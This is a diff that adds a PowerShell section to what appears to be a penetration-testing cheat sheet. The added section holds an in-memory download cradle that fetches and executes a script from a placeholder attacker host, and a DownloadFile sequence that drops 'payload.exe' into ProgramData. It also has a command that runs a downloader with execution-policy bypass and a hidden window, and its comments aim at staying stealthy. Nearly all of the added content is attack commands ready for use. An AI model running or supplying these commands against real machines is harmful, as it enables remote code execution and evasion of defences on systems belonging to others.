@@ -136,7 +136,22 @@ enum4linux.pl -a <targetIP> | tee enum4linux.log
 
 # PowerShell
 
+// in memory download cradle. if using cmd prompt, use single quotes instead. This downloads and executes a
+remotely hosted PS script
+
+PS C:\> iex (New-Object Net.WebClient).DownloadString("http://attacker_url/script.ps1")
+
+//DownloadFile method. Do not use this if trying to remain stealthy. The local var is where the file will be
+saved to
+
+PS C:\> $downloader = New-Object System.Net.WebClient
+PS C:\> $payload = "http://attacker_url/payload.exe"
+PS C:\> $local_file = "C:\programdata\payload.exe"
+PS C:\> $downloader.DownloadFile($payload,$local_file)
+
+//If trying to remain stealthy, also make sure to use the execution policy bypass and window hidden options
+
+C:\> powershell.exe -ExecutionPolicy Bypass -Window Hidden .\downloader.ps1
 
 
-
-
+//there is a powershell port-scanner script if needed in the offensive powershell folder
